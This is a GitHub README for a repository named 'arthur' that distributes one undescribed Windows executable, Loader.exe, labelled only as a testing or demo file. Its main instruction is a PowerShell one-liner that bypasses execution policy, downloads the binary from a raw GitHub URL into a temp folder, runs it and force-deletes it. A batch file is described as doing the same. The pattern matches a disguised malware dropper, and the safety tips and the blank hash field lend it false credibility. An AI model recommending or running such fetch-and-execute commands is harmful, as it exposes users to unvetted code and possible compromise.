# arthur

Standalone Windows binary (Loader.exe) for testing purposes.

Description
-----------
This repository contains a single Windows executable: Loader.exe. It is intended for testing/demo use only. The binary is provided as-is. See Usage below for how to download and run it.

Important security note
-----------------------
- Only run binaries from sources you trust. Scan the file with antivirus before running.
- Verify the file integrity using SHA256 (command shown below).
- Consider using a VM for testing.

Download URL (raw)
------------------
https://raw.githubusercontent.com/daophet11mm55-bit/arthur/main/Loader.exe

Release (recommended)
---------------------
For distributing the executable to others, using GitHub Releases is recommended. Releases provide a stable download URL like:

https://github.com/daophet11mm55-bit/arthur/releases/download/<tag>/Loader.exe

Usage
-----
Option A — Using the included run.bat (recommended for Windows users):
1. Download or clone this repository.
2. Double-click run.bat or run it from CMD:

    run.bat [args]

The batch file downloads Loader.exe to a temporary folder, runs it with any provided arguments, waits for it to finish, then deletes the temporary file.

Option B — PowerShell one-liner (downloads, runs, then removes):

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f=[IO.Path]::Combine($env:TEMP,'Loader.exe'); Invoke-WebRequest 'https://raw.githubusercontent.com/daophet11mm55-bit/arthur/main/Loader.exe' -OutFile $f; Start-Process -FilePath $f -ArgumentList $args -Wait; Remove-Item $f -Force"
```

Verify SHA256
-------------
To compute SHA256 on Windows (PowerShell):

```powershell
Get-FileHash .\Loader.exe -Algorithm SHA256
```

Place the computed hash here after verification:

SHA256: <paste SHA256 here>

Notes
-----
- If the file is larger than 100 MB, consider using Releases or Git LFS instead of committing the binary directly to the repository.
- Add a LICENSE file if you want to permit reuse.

If you want, I can:
- Create a GitHub Release for you and provide the release URL.
- Compute and add the SHA256 value if you upload the file somewhere I can fetch it from.
